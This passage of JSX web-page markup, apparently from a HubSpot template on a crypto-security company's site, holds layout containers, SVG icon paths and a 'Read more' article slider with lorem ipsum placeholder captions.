                                                  d="M33.9479 31.0631C33.3567 31.0631 32.8776 30.584 32.8674 29.9826C32.8776 29.3812 33.3567 28.9021 33.9479 28.9021C34.5493 28.8919 35.0386 29.3812 35.0284 29.9826C35.0284 30.2884 34.9061 30.5534 34.7124 30.7471C34.5085 30.951 34.2435 31.0733 33.9377 31.0733L33.9479 31.0631ZM33.9581 27.0978C33.3567 27.0877 32.8776 26.6086 32.8674 26.0071C32.8674 25.4159 33.3567 24.9266 33.9479 24.9266C34.5493 24.9368 35.0284 25.4159 35.0386 26.0173C35.0284 26.3129 34.9061 26.578 34.7124 26.7717C34.5187 26.9653 34.2537 27.0877 33.9581 27.0978Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M34.7124 22.8166C34.5187 23.0103 34.2333 23.1326 33.9479 23.1326C33.6625 23.1326 33.3771 23.0103 33.1834 22.8166C33.0815 22.7146 32.9999 22.5923 32.9489 22.4598C32.898 22.3273 32.8674 22.1948 32.8674 22.0521C32.8674 21.4812 33.3771 20.9716 33.9479 20.9716C34.2333 20.9716 34.5086 21.0837 34.7124 21.2876C34.9163 21.4914 35.0284 21.7666 35.0284 22.0521C35.0284 22.3375 34.9163 22.6127 34.7124 22.8166Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M29.9826 23.1224C29.3914 23.1224 28.9021 22.6332 28.9021 22.0419C28.9123 21.4405 29.3914 20.9614 29.9826 20.9614C30.584 20.9512 31.0631 21.4507 31.0631 22.0419C31.0631 22.3477 30.9408 22.6128 30.7471 22.8064C30.5534 23.0001 30.2884 23.1224 29.9826 23.1224ZM26.0173 23.1122C25.4261 23.1122 24.947 22.6332 24.9368 22.0317C24.9368 21.4405 25.4261 20.9512 26.0173 20.9512C26.6188 20.9614 27.0978 21.4405 27.0978 22.0317C27.0978 22.3375 26.9755 22.6026 26.7818 22.7963C26.5882 22.9899 26.3231 23.1122 26.0173 23.1122Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8269 22.7963C22.725 22.8982 22.6026 22.9798 22.4701 23.0307C22.3376 23.0817 22.1949 23.1021 22.0624 23.1123C21.777 23.1123 21.4915 22.99 21.2877 22.7861C21.0838 22.5822 20.9717 22.307 20.9717 22.0216C20.9819 21.8891 21.0023 21.7463 21.0532 21.6138C21.2265 21.2163 21.6343 20.9513 22.0522 20.9411C22.3376 20.9411 22.623 21.0634 22.8167 21.2571C23.0206 21.4609 23.1429 21.7463 23.1429 22.0318C23.1429 22.3172 23.0308 22.5924 22.8269 22.7963Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8166 34.7123C22.6229 34.906 22.3375 35.0283 22.0521 35.0283C21.7667 35.0283 21.4813 34.906 21.2876 34.7123C21.0837 34.5085 20.9614 34.223 20.9716 33.9478C20.9716 33.377 21.4915 32.8571 22.0521 32.8673C22.3273 32.8571 22.6127 32.9794 22.8166 33.1833C23.0205 33.3872 23.1326 33.6624 23.1326 33.9478C23.1326 34.2332 23.0205 34.5085 22.8166 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M26.5678 29.432C26.1397 29.0039 26.1499 28.3209 26.5678 27.903C26.9858 27.4851 27.6687 27.4749 28.0969 27.903C28.5148 28.3209 28.5148 29.0141 28.0969 29.432C27.6789 29.8499 26.9858 29.8499 26.5678 29.432ZM23.9277 32.0721C23.4996 31.644 23.5098 30.961 23.9277 30.5431C24.3558 30.115 25.0286 30.115 25.4567 30.5431C25.8747 30.961 25.8849 31.644 25.4567 32.0721C25.0388 32.4901 24.3457 32.4901 23.9277 32.0721Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M30.737 26.7919C30.5331 26.9958 30.2579 27.1079 29.9724 27.1079C29.687 27.1079 29.4016 26.9856 29.2079 26.7919C29.0041 26.588 28.8817 26.3026 28.8919 26.0274C28.8919 25.4566 29.4016 24.9469 29.9724 24.9469C30.2477 24.9367 30.5331 25.059 30.737 25.2629C30.9408 25.4668 31.053 25.742 31.053 26.0274C31.053 26.3128 30.9408 26.588 30.737 26.7919Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_430_39555">
                                                  <rect
                                                    width="18.9856"
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(14.5701 27.9949) rotate(-45)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        {/*end widget-span */}
                      </div>
                      {/*end row*/}
                    </div>
                    {/*end row-wrapper */}
                  </div>
                  {/*end widget-span */}
                </div>
                {/*end row*/}
              </div>
              {/*end row-wrapper */}
              <div className="row-fluid-wrapper row-depth-1 row-number-15 dnd-section dnd_area-row-7-hidden">
                <div className="row-fluid ">
                  <div
                    className="span12 widget-span widget-type-cell dnd-column"
                    style={{}}
                    data-widget-type="cell"
                    data-x={0}
                    data-w={12}
                  >
                    <div className="row-fluid-wrapper row-depth-1 row-number-16 dnd-row">
                      <div className="row-fluid ">
                        <div
                          className="span12 widget-span widget-type-custom_widget dnd-module"
                          style={{}}
                          data-widget-type="custom_widget"
                          data-x={0}
                          data-w={12}
                        >
                          <div
                            id="hs_cos_wrapper_widget_1748079990652"
                            className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                            style={{}}
                            data-hs-cos-general-type="widget"
                            data-hs-cos-type="module"
                          >
                            <div className="case_studies_slider_wrapper">
                              <div className="content-wrapper">
                                <div className="content_inner">
                                  <div className="content_section ">
                                    <div className="heading">
                                      <h2>Read more</h2>
                                    </div>
                                    <div className="custom_arrows_section">
                                      <div className="prev_slideCase">
                                        <svg
                                          width={20}
                                          height={20}
                                          viewBox="0 0 20 20"
                                          fill="none"
                                          xmlns="http://www.w3.org/2000/svg"
                                        >
                                          <g clipPath="url(#clip0_2048_64905)">
                                            <path
                                              d="M9.99304 0.500485C10.1372 0.500485 10.2669 0.529317 10.4111 0.58698C10.5408 0.644644 10.6562 0.716722 10.7571 0.817633C10.9589 1.01945 11.0742 1.29335 11.0742 1.58167C11.0742 1.72583 11.0454 1.86998 10.9877 1.99973C10.9301 2.12947 10.858 2.2448 10.7571 2.34571C10.3534 2.74935 9.63264 2.74935 9.229 2.34571C9.02718 2.14389 8.91185 1.86998 8.91185 1.58167C8.91185 1.29335 9.02718 1.01945 9.229 0.817633C9.43082 0.615812 9.70472 0.500485 9.99304 0.500485Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M7.95989 3.62856C8.37795 4.04661 8.37795 4.72416 7.95989 5.15663C7.52742 5.57469 6.84988 5.57469 6.43182 5.15663C5.99935 4.73857 5.99935 4.04661 6.43182 3.62856C6.64806 3.41232 6.92196 3.31141 7.19586 3.31141C7.48417 3.31141 7.75807 3.41232 7.97431 3.62856H7.95989ZM5.14882 6.42522C5.56687 6.85769 5.56687 7.53523 5.14882 7.96771C4.73076 8.38576 4.0388 8.38576 3.62074 7.96771C3.20269 7.53523 3.20269 6.85769 3.62074 6.42522C3.83698 6.2234 4.11088 6.12249 4.38478 6.12249C4.65868 6.12249 4.93258 6.2234 5.14882 6.42522Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M1.58679 8.91455C1.86068 8.91455 2.149 9.02988 2.35082 9.2317C2.55264 9.43352 2.66797 9.72183 2.66797 9.99573C2.66797 10.1399 2.63914 10.284 2.58147 10.4138C2.52381 10.5435 2.45173 10.6589 2.35082 10.7598C1.94718 11.1634 1.22639 11.1634 0.822749 10.7598C0.620928 10.5579 0.505601 10.284 0.505601 9.99573C0.505601 9.70742 0.620928 9.43352 0.822749 9.2317C1.02457 9.02988 1.29847 8.91455 1.58679 8.91455Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M5.14761 12.0426C5.56567 12.4607 5.56567 13.1526 5.14761 13.5707C4.71513 13.9887 4.03759 13.9887 3.61953 13.5707C3.18706 13.1526 3.20148 12.4607 3.61953 12.0426C3.83577 11.8264 4.10967 11.7255 4.38357 11.7255C4.65747 11.7255 4.93137 11.8264 5.14761 12.0426ZM7.94427 14.8537C8.36233 15.2718 8.36233 15.9493 7.94427 16.3818C7.52621 16.7998 6.83425 16.7998 6.4162 16.3818C5.99814 15.9493 5.99814 15.2718 6.4162 14.8537C6.63243 14.6375 6.90633 14.5365 7.18023 14.5365C7.45413 14.5365 7.72803 14.6375 7.94427 14.8537Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M9.97741 17.3348C10.1216 17.3348 10.2657 17.3637 10.3955 17.4213C10.5252 17.479 10.6405 17.5655 10.7414 17.652C10.9433 17.8538 11.0586 18.1421 11.0586 18.4304C11.0586 18.7187 10.9433 18.9926 10.7414 19.1945C10.6405 19.281 10.5252 19.3675 10.3955 19.4251C9.99183 19.5837 9.5161 19.4828 9.21337 19.1945C9.01155 18.9926 8.89623 18.7043 8.89623 18.4304C8.89623 18.1421 9.01155 17.8538 9.21337 17.652C9.41519 17.4502 9.68909 17.3348 9.97741 17.3348Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M18.411 8.91455C18.6849 8.91455 18.9732 9.02988 19.175 9.2317C19.3769 9.43352 19.4922 9.72183 19.4922 9.99573C19.4922 10.284 19.3769 10.5724 19.175 10.7598C18.7714 11.1634 18.0362 11.1634 17.647 10.7598C17.4451 10.5724 17.3298 10.284 17.3298 9.99573C17.3298 9.70742 17.4451 9.43352 17.647 9.2317C17.8488 9.02988 18.1227 8.91455 18.411 8.91455Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M12.0241 9.99694C12.0241 10.6024 11.534 11.0781 10.9429 11.0781C10.3519 11.0781 9.86176 10.6024 9.86176 9.99694C9.86176 9.40589 10.3519 8.91576 10.9429 8.91576C11.534 8.91576 12.0241 9.40589 12.0241 9.99694ZM15.7578 9.99694C15.7578 10.6024 15.2677 11.0781 14.6766 11.0781C14.0712 11.0781 13.5954 10.6024 13.5954 9.99694C13.5954 9.40589 14.0712 8.91576 14.6766 8.91576C15.2677 8.91576 15.7578 9.40589 15.7578 9.99694Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M7.21178 8.91455C7.5001 8.91455 7.774 9.02988 7.97582 9.2317C8.17764 9.43352 8.29297 9.72183 8.29297 9.99573C8.29297 10.284 8.17764 10.5724 7.97582 10.7598C7.57218 11.1634 6.85139 11.1634 6.44775 10.7598C6.24593 10.5724 6.1306 10.284 6.1306 9.99573C6.1306 9.70742 6.24593 9.43352 6.44775 9.2317C6.64957 9.02988 6.92347 8.91455 7.21178 8.91455Z"
                                              fill="#DFE4EC"
                                            />
                                          </g>
                                          <defs>
                                            <clipPath id="clip0_2048_64905">
                                              <rect
                                                width="18.9856"
                                                height={19}
                                                fill="white"
                                                transform="matrix(-1 0 0 -1 19.4922 19.5)"
                                              />
                                            </clipPath>
                                          </defs>
                                        </svg>
                                      </div>
                                      <div className="next_slideCase">
                                        <svg
                                          width={20}
                                          height={20}
                                          viewBox="0 0 20 20"
                                          fill="none"
                                          xmlns="http://www.w3.org/2000/svg"
                                        >
                                          <g clipPath="url(#clip0_2048_64919)">
                                            <path
                                              d="M10.007 19.4995C9.86281 19.4995 9.73307 19.4707 9.58891 19.413C9.45917 19.3554 9.34384 19.2833 9.24293 19.1824C9.04111 18.9805 8.92578 18.7066 8.92578 18.4183C8.92578 18.2742 8.95461 18.13 9.01228 18.0003C9.06994 17.8705 9.14202 17.7552 9.24293 17.6543C9.64657 17.2507 10.3674 17.2507 10.771 17.6543C10.9728 17.8561 11.0881 18.13 11.0881 18.4183C11.0881 18.7066 10.9728 18.9805 10.771 19.1824C10.5692 19.3842 10.2953 19.4995 10.007 19.4995Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M12.0401 16.3714C11.622 15.9534 11.622 15.2758 12.0401 14.8434C12.4726 14.4253 13.1501 14.4253 13.5682 14.8434C14.0007 15.2614 14.0007 15.9534 13.5682 16.3714C13.3519 16.5877 13.078 16.6886 12.8041 16.6886C12.5158 16.6886 12.2419 16.5877 12.0257 16.3714H12.0401ZM14.8512 13.5748C14.4331 13.1423 14.4331 12.4648 14.8512 12.0323C15.2692 11.6142 15.9612 11.6142 16.3793 12.0323C16.7973 12.4648 16.7973 13.1423 16.3793 13.5748C16.163 13.7766 15.8891 13.8775 15.6152 13.8775C15.3413 13.8775 15.0674 13.7766 14.8512 13.5748Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M18.4132 11.0855C18.1393 11.0855 17.851 10.9701 17.6492 10.7683C17.4474 10.5665 17.332 10.2782 17.332 10.0043C17.332 9.86011 17.3609 9.71595 17.4185 9.58621C17.4762 9.45647 17.5483 9.34114 17.6492 9.24023C18.0528 8.83659 18.7736 8.83659 19.1773 9.24023C19.3791 9.44205 19.4944 9.71595 19.4944 10.0043C19.4944 10.2926 19.3791 10.5665 19.1773 10.7683C18.9754 10.9701 18.7015 11.0855 18.4132 11.0855Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M14.8524 7.95738C14.4343 7.53932 14.4343 6.84737 14.8524 6.42931C15.2849 6.01125 15.9624 6.01125 16.3805 6.42931C16.8129 6.84737 16.7985 7.53932 16.3805 7.95738C16.1642 8.17362 15.8903 8.27453 15.6164 8.27453C15.3425 8.27453 15.0686 8.17362 14.8524 7.95738ZM12.0557 5.1463C11.6377 4.72825 11.6377 4.0507 12.0557 3.61823C12.4738 3.20017 13.1657 3.20017 13.5838 3.61823C14.0019 4.0507 14.0019 4.72825 13.5838 5.1463C13.3676 5.36254 13.0937 5.46345 12.8198 5.46345C12.5459 5.46345 12.272 5.36254 12.0557 5.1463Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M10.0226 2.66517C9.87843 2.66517 9.73427 2.63634 9.60453 2.57867C9.47479 2.52101 9.35946 2.43451 9.25855 2.34802C9.05673 2.1462 8.94141 1.85788 8.94141 1.56957C8.94141 1.28125 9.05673 1.00735 9.25855 0.805532C9.35946 0.719037 9.47479 0.632542 9.60453 0.574879C10.0082 0.416305 10.4839 0.517216 10.7866 0.805532C10.9884 1.00735 11.1038 1.29567 11.1038 1.56957C11.1038 1.85788 10.9884 2.1462 10.7866 2.34802C10.5848 2.54984 10.3109 2.66517 10.0226 2.66517Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M1.589 11.0855C1.3151 11.0855 1.02678 10.9701 0.82496 10.7683C0.623139 10.5665 0.507813 10.2782 0.507813 10.0043C0.507812 9.71595 0.623139 9.42764 0.82496 9.24023C1.2286 8.83659 1.96381 8.83659 2.35303 9.24023C2.55485 9.42764 2.67018 9.71595 2.67018 10.0043C2.67018 10.2926 2.55485 10.5665 2.35303 10.7683C2.15121 10.9701 1.87731 11.0855 1.589 11.0855Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M7.97588 10.0031C7.97588 9.3976 8.46601 8.92188 9.05706 8.92188C9.64811 8.92188 10.1382 9.3976 10.1382 10.0031C10.1382 10.5941 9.64811 11.0842 9.05706 11.0842C8.46601 11.0842 7.97588 10.5941 7.97588 10.0031ZM4.24219 10.0031C4.24219 9.3976 4.73232 8.92188 5.32337 8.92188C5.92883 8.92188 6.40456 9.3976 6.40456 10.0031C6.40456 10.5941 5.92883 11.0842 5.32337 11.0842C4.73232 11.0842 4.24219 10.5941 4.24219 10.0031Z"
                                              fill="#3939EF"
                                            />
                                            <path
                                              d="M12.7882 11.0855C12.4999 11.0855 12.226 10.9701 12.0242 10.7683C11.8224 10.5665 11.707 10.2782 11.707 10.0043C11.707 9.71595 11.8224 9.42764 12.0242 9.24023C12.4278 8.83659 13.1486 8.83659 13.5523 9.24023C13.7541 9.42764 13.8694 9.71595 13.8694 10.0043C13.8694 10.2926 13.7541 10.5665 13.5523 10.7683C13.3504 10.9701 13.0765 11.0855 12.7882 11.0855Z"
                                              fill="#3939EF"
                                            />
                                          </g>
                                          <defs>
                                            <clipPath id="clip0_2048_64919">
                                              <rect
                                                width="18.9856"
                                                height={19}
                                                fill="white"
                                                transform="translate(0.507812 0.5)"
                                              />
                                            </clipPath>
                                          </defs>
                                        </svg>
                                      </div>
                                    </div>
                                    <div className="button_wrapper">
                                      <a
                                        className="blue_btn_with_arrow"
                                        href=""
                                      >
                                        <span>See all articles</span>
                                      </a>
                                    </div>
                                  </div>
                                  <div className="slides">
                                    <div className="slide">
                                      <div className="slide_inner">
                                        <div className="image">
                                          <img
                                            src="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg"
                                            alt="image"
                                            loading="lazy"
                                            width={1920}
                                            height={1280}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                            srcSet="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=960&height=640&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 960w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 1920w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=2880&height=1920&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 2880w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=3840&height=2560&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 3840w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=4800&height=3200&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 4800w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=5760&height=3840&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 5760w"
                                            sizes="(max-width: 1920px) 100vw, 1920px"
                                          />
                                        </div>
                                        <div className="description">
                                          <h6>
                                            <a href="">
                                              Horem ipsum dolor sit amet,
                                              consectetur adipiscing elit. Nunc
                                              vulputate libero et velit
                                              interdum, ac aliquet odio mattis.
                                            </a>
                                          </h6>
                                        </div>
                                        <div className="link">
                                          <a href="">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_430_39555)">
                                                <path
                                                  d="M34.7226 34.7123C34.6207 34.8143 34.5086 34.8856 34.3658 34.9468C34.2333 34.9977 34.1008 35.0283 33.9581 35.0283C33.6727 35.0283 33.3975 34.9162 33.1936 34.7123C33.0917 34.6104 33.0101 34.4881 32.9591 34.3556C32.9082 34.223 32.8776 34.0905 32.8776 33.9478C32.8776 33.377 33.3873 32.8673 33.9581 32.8673C34.2435 32.8673 34.5187 32.9794 34.7226 33.1833C34.9265 33.3872 35.0386 33.6624 35.0386 33.9478C35.0386 34.2332 34.9265 34.5085 34.7226 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M33.9479 31.0631C33.3567 31.0631 32.8776 30.584 32.8674 29.9826C32.8776 29.3812 33.3567 28.9021 33.9479 28.9021C34.5493 28.8919 35.0386 29.3812 35.0284 29.9826C35.0284 30.2884 34.9061 30.5534 34.7124 30.7471C34.5085 30.951 34.2435 31.0733 33.9377 31.0733L33.9479 31.0631ZM33.9581 27.0978C33.3567 27.0877 32.8776 26.6086 32.8674 26.0071C32.8674 25.4159 33.3567 24.9266 33.9479 24.9266C34.5493 24.9368 35.0284 25.4159 35.0386 26.0173C35.0284 26.3129 34.9061 26.578 34.7124 26.7717C34.5187 26.9653 34.2537 27.0877 33.9581 27.0978Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M34.7124 22.8166C34.5187 23.0103 34.2333 23.1326 33.9479 23.1326C33.6625 23.1326 33.3771 23.0103 33.1834 22.8166C33.0815 22.7146 32.9999 22.5923 32.9489 22.4598C32.898 22.3273 32.8674 22.1948 32.8674 22.0521C32.8674 21.4812 33.3771 20.9716 33.9479 20.9716C34.2333 20.9716 34.5086 21.0837 34.7124 21.2876C34.9163 21.4914 35.0284 21.7666 35.0284 22.0521C35.0284 22.3375 34.9163 22.6127 34.7124 22.8166Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M29.9826 23.1224C29.3914 23.1224 28.9021 22.6332 28.9021 22.0419C28.9123 21.4405 29.3914 20.9614 29.9826 20.9614C30.584 20.9512 31.0631 21.4507 31.0631 22.0419C31.0631 22.3477 30.9408 22.6128 30.7471 22.8064C30.5534 23.0001 30.2884 23.1224 29.9826 23.1224ZM26.0173 23.1122C25.4261 23.1122 24.947 22.6332 24.9368 22.0317C24.9368 21.4405 25.4261 20.9512 26.0173 20.9512C26.6188 20.9614 27.0978 21.4405 27.0978 22.0317C27.0978 22.3375 26.9755 22.6026 26.7818 22.7963C26.5882 22.9899 26.3231 23.1122 26.0173 23.1122Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8269 22.7963C22.725 22.8982 22.6026 22.9798 22.4701 23.0307C22.3376 23.0817 22.1949 23.1021 22.0624 23.1123C21.777 23.1123 21.4915 22.99 21.2877 22.7861C21.0838 22.5822 20.9717 22.307 20.9717 22.0216C20.9819 21.8891 21.0023 21.7463 21.0532 21.6138C21.2265 21.2163 21.6343 20.9513 22.0522 20.9411C22.3376 20.9411 22.623 21.0634 22.8167 21.2571C23.0206 21.4609 23.1429 21.7463 23.1429 22.0318C23.1429 22.3172 23.0308 22.5924 22.8269 22.7963Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8166 34.7123C22.6229 34.906 22.3375 35.0283 22.0521 35.0283C21.7667 35.0283 21.4813 34.906 21.2876 34.7123C21.0837 34.5085 20.9614 34.223 20.9716 33.9478C20.9716 33.377 21.4915 32.8571 22.0521 32.8673C22.3273 32.8571 22.6127 32.9794 22.8166 33.1833C23.0205 33.3872 23.1326 33.6624 23.1326 33.9478C23.1326 34.2332 23.0205 34.5085 22.8166 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M26.5678 29.432C26.1397 29.0039 26.1499 28.3209 26.5678 27.903C26.9858 27.4851 27.6687 27.4749 28.0969 27.903C28.5148 28.3209 28.5148 29.0141 28.0969 29.432C27.6789 29.8499 26.9858 29.8499 26.5678 29.432ZM23.9277 32.0721C23.4996 31.644 23.5098 30.961 23.9277 30.5431C24.3558 30.115 25.0286 30.115 25.4567 30.5431C25.8747 30.961 25.8849 31.644 25.4567 32.0721C25.0388 32.4901 24.3457 32.4901 23.9277 32.0721Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M30.737 26.7919C30.5331 26.9958 30.2579 27.1079 29.9724 27.1079C29.687 27.1079 29.4016 26.9856 29.2079 26.7919C29.0041 26.588 28.8817 26.3026 28.8919 26.0274C28.8919 25.4566 29.4016 24.9469 29.9724 24.9469C30.2477 24.9367 30.5331 25.059 30.737 25.2629C30.9408 25.4668 31.053 25.742 31.053 26.0274C31.053 26.3128 30.9408 26.588 30.737 26.7919Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_430_39555">
                                                  <rect
                                                    width="18.9856"
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(14.5701 27.9949) rotate(-45)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="slide">
                                      <div className="slide_inner">
                                        <div className="image">
                                          <img
                                            src="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg"
                                            alt="image"
                                            loading="lazy"
                                            width={1920}
                                            height={1280}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                            srcSet="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=960&height=640&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 960w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 1920w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=2880&height=1920&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 2880w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=3840&height=2560&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 3840w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=4800&height=3200&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 4800w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=5760&height=3840&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 5760w"
                                            sizes="(max-width: 1920px) 100vw, 1920px"
                                          />
                                        </div>
                                        <div className="description">
                                          <h6>
                                            <a href="">
                                              Horem ipsum dolor sit amet,
                                              consectetur adipiscing elit. Nunc
                                              vulputate libero et velit
                                              interdum, ac aliquet odio mattis.
                                            </a>
                                          </h6>
                                        </div>
                                        <div className="link">
                                          <a href="">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_430_39555)">
                                                <path
                                                  d="M34.7226 34.7123C34.6207 34.8143 34.5086 34.8856 34.3658 34.9468C34.2333 34.9977 34.1008 35.0283 33.9581 35.0283C33.6727 35.0283 33.3975 34.9162 33.1936 34.7123C33.0917 34.6104 33.0101 34.4881 32.9591 34.3556C32.9082 34.223 32.8776 34.0905 32.8776 33.9478C32.8776 33.377 33.3873 32.8673 33.9581 32.8673C34.2435 32.8673 34.5187 32.9794 34.7226 33.1833C34.9265 33.3872 35.0386 33.6624 35.0386 33.9478C35.0386 34.2332 34.9265 34.5085 34.7226 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M33.9479 31.0631C33.3567 31.0631 32.8776 30.584 32.8674 29.9826C32.8776 29.3812 33.3567 28.9021 33.9479 28.9021C34.5493 28.8919 35.0386 29.3812 35.0284 29.9826C35.0284 30.2884 34.9061 30.5534 34.7124 30.7471C34.5085 30.951 34.2435 31.0733 33.9377 31.0733L33.9479 31.0631ZM33.9581 27.0978C33.3567 27.0877 32.8776 26.6086 32.8674 26.0071C32.8674 25.4159 33.3567 24.9266 33.9479 24.9266C34.5493 24.9368 35.0284 25.4159 35.0386 26.0173C35.0284 26.3129 34.9061 26.578 34.7124 26.7717C34.5187 26.9653 34.2537 27.0877 33.9581 27.0978Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M34.7124 22.8166C34.5187 23.0103 34.2333 23.1326 33.9479 23.1326C33.6625 23.1326 33.3771 23.0103 33.1834 22.8166C33.0815 22.7146 32.9999 22.5923 32.9489 22.4598C32.898 22.3273 32.8674 22.1948 32.8674 22.0521C32.8674 21.4812 33.3771 20.9716 33.9479 20.9716C34.2333 20.9716 34.5086 21.0837 34.7124 21.2876C34.9163 21.4914 35.0284 21.7666 35.0284 22.0521C35.0284 22.3375 34.9163 22.6127 34.7124 22.8166Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M29.9826 23.1224C29.3914 23.1224 28.9021 22.6332 28.9021 22.0419C28.9123 21.4405 29.3914 20.9614 29.9826 20.9614C30.584 20.9512 31.0631 21.4507 31.0631 22.0419C31.0631 22.3477 30.9408 22.6128 30.7471 22.8064C30.5534 23.0001 30.2884 23.1224 29.9826 23.1224ZM26.0173 23.1122C25.4261 23.1122 24.947 22.6332 24.9368 22.0317C24.9368 21.4405 25.4261 20.9512 26.0173 20.9512C26.6188 20.9614 27.0978 21.4405 27.0978 22.0317C27.0978 22.3375 26.9755 22.6026 26.7818 22.7963C26.5882 22.9899 26.3231 23.1122 26.0173 23.1122Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8269 22.7963C22.725 22.8982 22.6026 22.9798 22.4701 23.0307C22.3376 23.0817 22.1949 23.1021 22.0624 23.1123C21.777 23.1123 21.4915 22.99 21.2877 22.7861C21.0838 22.5822 20.9717 22.307 20.9717 22.0216C20.9819 21.8891 21.0023 21.7463 21.0532 21.6138C21.2265 21.2163 21.6343 20.9513 22.0522 20.9411C22.3376 20.9411 22.623 21.0634 22.8167 21.2571C23.0206 21.4609 23.1429 21.7463 23.1429 22.0318C23.1429 22.3172 23.0308 22.5924 22.8269 22.7963Z"
                                                  fill="#3939EF"
                                                />
                                                <path
